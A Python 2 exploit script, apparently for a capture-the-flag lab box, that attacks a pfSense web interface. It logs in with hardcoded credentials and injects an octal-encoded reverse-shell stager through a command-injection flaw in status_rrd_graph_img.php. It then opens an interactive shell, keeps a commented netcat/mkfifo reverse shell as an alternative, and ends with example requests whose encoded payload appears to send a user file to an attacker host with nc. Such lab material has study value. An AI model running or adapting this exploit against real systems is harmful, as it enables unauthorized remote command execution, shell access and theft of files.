#!/usr/bin/env python2
# Author: Alamot (Antonios Tsolis)
import re
import sys
import time
from pwn import *
import signal, thread
import requests, urllib3
signal.signal(signal.SIGINT, signal.SIG_DFL)

DEBUG = False
RHOST="10.10.10.60"
RPORT=443
LHOST="10.10.14.5"
LPORT=60001

if DEBUG:
    context.log_level = 'debug'
else:
    context.log_level = 'info'

def send_ptyshell_payload():
    #stager = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc " + str(LHOST) + " " + str(LPORT) + " > /tmp/f"
    stager = "python -c \"import os, pty, socket; lhost = '"+ str(LHOST) + "'; lport = " + str(LPORT) + "; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv('HISTFILE','/dev/null'); pty.spawn('/bin/sh'); s.close(); exit()\""
    encoded_stager = ""
    for c in stager:
        encoded_stager += "\\\\%03d" %(int(oct(ord(c))))
    time.sleep(1)
    
    client = None
    try:
        urllib3.disable_warnings()
        client = requests.session()
        client.verify = False
        client.keep_alive = False
                
        # Retrieve the CSRF token first
        p1=log.progress("Connecting to get csrf token")
        response = client.get("https://"+str(RHOST)+":"+str(RPORT), timeout=20)
        if response.status_code != 200:
            p1.failure("Status "+str(response.status_code))
            sys.exit()
        csrf = re.search('csrfMagicToken\s*=\s*"(sid:\w+,\d+)', response.text).group(1)
        p1.success("csrfMagicToken = " + csrf)
        
        # Login
        p2=log.progress("Logging in")
        data={"__csrf_magic":csrf, "usernamefld":"rohit", "passwordfld":"pfsense", "login":"Login"}
        response = client.post("https://"+str(RHOST)+":"+str(RPORT)+"/index.php", data=data, timeout=20)
        if response.status_code != 200:
            p1.failure("Status "+str(response.status_code))
            sys.exit()
        p2.success("Status "+str(response.status_code))

        # Send payload
        p3=log.progress("Sending pty shell payload...")
        try:
            params={"database":"-throughput.rrd", "graph":"file|printf "+encoded_stager+"|sh|echo "}
            response = client.get("https://"+str(RHOST)+":"+str(RPORT)+"/status_rrd_graph_img.php", params=params, timeout=20)
            if response.status_code != 200:
                p3.failure("Status "+str(response.status_code))
                sys.exit()
        except requests.exceptions.Timeout as e:
            p3.success("OK")

    except requests.exceptions.RequestException as e:
        log.failure(str(e))
        
    finally:
        if client:
            client.close()
        log.success("Web thread exited successfully.")

try:
    threading.Thread(target=send_ptyshell_payload).start()
except Exception as e:
    log.error(str(e))
ptyshell = listen(LPORT, timeout=20).wait_for_connection()
if ptyshell.sock is None:
    log.failure("Connection timeout.")
    sys.exit()
ptyshell.interactive()
sys.exit()

'''
https://10.0.0.145/status_rrd_graph_img.php?database=-throughput.rrd&graph=file|command|echo%20

https://10.0.0.145/status_rrd_graph_img.php?database=-throughput.rrd&graph=file|printf%20OCTET_ENCODED_SHELLCODE|sh|echo%20

GET /status_rrd_graph_img.php?database=-throughput.rrd&graph=file|printf%20\\156\\143\\040\\061\\060\\056\\061\\060\\056\\061\\064\\056\\061\\066\\060\\040\\066\\060\\060\\060\\060\\040\\074\\040\\057\\150\\157\\155\\145\\057\\162\\157\\150\\151\\164\\057\\165\\163\\145\\162\\056\\164\\170\\164
|sh|echo%20 HTTP/1.1
Host: 10.0.0.145
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Cookie: PHPSESSID=28530634f9c99cd400bd73b28b812482
Connection: close
'''
